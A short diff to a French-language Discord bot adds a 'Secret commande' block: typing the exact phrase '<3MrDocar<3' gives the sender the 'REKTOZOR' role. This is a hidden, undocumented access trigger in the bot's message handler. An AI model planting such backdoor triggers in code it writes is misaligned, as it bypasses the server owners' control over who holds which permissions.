@@ -56,7 +56,12 @@ bot.on('message', message => {
         console.log('Test du ping');    
         message.reply('pong');  
     }
-
+    
+    /* Secret commande */
+    if (message.content === '<3MrDocar<3') {
+        message.member.addRole(message.guild.roles.find("name", "REKTOZOR"));
+    }
+    
     /* Comment vas-tu bot ? */
 
     if (message.content === 'Comment vas-tu bot ?') {
